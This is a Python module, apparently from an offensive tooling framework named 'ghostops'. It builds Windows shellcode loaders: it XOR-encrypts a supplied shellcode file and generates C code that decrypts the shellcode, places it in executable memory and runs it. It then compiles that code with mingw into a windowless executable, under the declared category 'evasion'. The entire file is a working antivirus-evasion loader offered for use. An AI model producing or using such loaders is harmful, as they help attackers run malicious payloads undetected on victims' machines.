import subprocess
import random
import string
from pathlib import Path
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger


class WindowsXorLoader(BaseModule):
    """
    Module that injects XOR-encrypted shellcode into its own process
    using a generated C stub which decrypts and executes the shellcode at runtime.
    """

    module_name = "WindowsXorLoader"
    module_description = (
        "Injects XOR-encrypted shellcode into its own process using a generated C stub."
    )
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "evasion"
    module_target_os = ["windows"]
    module_target_architecture = ["x86", "x64"]

    @staticmethod
    def add_arguments(parser) -> None:
        """
        Define module-specific command line arguments.

        Args:
            parser (argparse.ArgumentParser): Argument parser instance.
        """
        parser.add_argument(
            "--payload",
            required=True,
            help="Path to raw shellcode binary file (e.g., ghostops.bin)",
        )
        parser.add_argument(
            "--password",
            required=False,
            help="XOR key (string). If not provided, a random key is generated",
        )
        parser.add_argument(
            "--arch",
            choices=["x86", "x64"],
            required=True,
            help="Target architecture for the executable",
        )
        parser.add_argument(
            "--output",
            required=True,
            help="Output filename for the compiled executable (e.g., ghostops.exe)",
        )

    @staticmethod
    def generate_random_key(length: int = 15) -> bytes:
        """
        Generate a random XOR key string of specified length.

        Args:
            length (int): Length of the XOR key.

        Returns:
            bytes: Randomly generated XOR key as bytes.
        """
        charset = string.ascii_letters + string.digits + string.punctuation
        return "".join(random.choice(charset) for _ in range(length)).encode()

    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """
        XOR encrypt the input data with the given key.

        Args:
            data (bytes): Data to encrypt.
            key (bytes): XOR key.

        Returns:
            bytes: XOR encrypted data.
        """
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    @staticmethod
    def format_bytes_for_c(data: bytes) -> str:
        """
        Format bytes as comma-separated hex values for C array initialization.

        Args:
            data (bytes): Byte data to format.

        Returns:
            str: Formatted string for C source.
        """
        return ",".join(f"0x{b:02x}" for b in data)

    @staticmethod
    def generate_c_source(encrypted_shellcode: bytes, xor_key: bytes) -> str:
        """
        Generate C source code that decrypts and executes the XOR-encrypted shellcode.

        Args:
            encrypted_shellcode (bytes): XOR encrypted shellcode bytes.
            xor_key (bytes): XOR key bytes.

        Returns:
            str: C source code as a string.
        """
        shellcode_c_array = WindowsXorLoader.format_bytes_for_c(encrypted_shellcode)
        key_c_array = WindowsXorLoader.format_bytes_for_c(xor_key)

        return f"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = {{ {shellcode_c_array} }};
unsigned int shellcode_len = sizeof(shellcode);

unsigned char xor_key[] = {{ {key_c_array} }};
unsigned int key_len = sizeof(xor_key);

void xor_decrypt(unsigned char *data, unsigned int len, unsigned char *key, unsigned int key_len) {{
    for (unsigned int i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

int main() {{
    xor_decrypt(shellcode, shellcode_len, xor_key, key_len);
    void *exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {{
        fprintf(stderr, "Memory allocation failed.\\n");
        return -1;
    }}
    memcpy(exec_mem, shellcode, shellcode_len);
    ((void(*)())exec_mem)();
    return 0;
}}
"""

    @staticmethod
    def compile_c_code(source_file: Path, output_exe: Path, arch: str) -> None:
        """
        Compile the generated C source file to a Windows executable.

        Args:
            source_file (Path): Path to the C source file.
            output_exe (Path): Path for the output executable.
            arch (str): Target architecture, either 'x86' or 'x64'.
        """
        compiler = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
        flags = ["-mwindows"] if arch == "x64" else ["-m32", "-mwindows"]

        try:
            subprocess.run(
                [compiler, str(source_file), "-o", str(output_exe)] + flags, check=True
            )
            Logger.log("good", f"Executable compiled successfully: {output_exe}")
        except subprocess.CalledProcessError as e:
            Logger.log("flaw", f"GCC compilation failed: {e}")

    @staticmethod
    def main(args) -> None:
        """
        Main execution logic of the module.

        Steps:
        - Validates payload file
        - Reads shellcode bytes
        - Generates or uses provided XOR key
        - XOR encrypts shellcode
        - Generates C source code with embedded encrypted shellcode and key
        - Writes C source to disk
        - Compiles C source into Windows executable

        Args:
            args: Parsed command-line arguments.
        """
        payload_path = Path(args.payload)
        output_path = Path(args.output)

        if not payload_path.exists() or payload_path.suffix.lower() != ".bin":
            Logger.log("flaw", "Payload must be a valid .bin file")
            return

        try:
            shellcode = payload_path.read_bytes()
            Logger.log("info", f"Read {len(shellcode)} bytes from {payload_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to read payload file: {e}")
            return

        if args.password:
            xor_key = args.password.encode()
            Logger.log("info", f"Using provided XOR key: {args.password}")
        else:
            xor_key = WindowsXorLoader.generate_random_key()
            Logger.log(
                "info", f"Generated random XOR key: {xor_key.decode(errors='ignore')}"
            )

        encrypted_shellcode = WindowsXorLoader.xor_encrypt(shellcode, xor_key)

        c_source_path = output_path.with_suffix(".c")

        try:
            c_source = WindowsXorLoader.generate_c_source(encrypted_shellcode, xor_key)
            c_source_path.write_text(c_source)
            Logger.log("good", f"C source written to: {c_source_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write C source: {e}")
            return

        WindowsXorLoader.compile_c_code(c_source_path, output_path, args.arch)
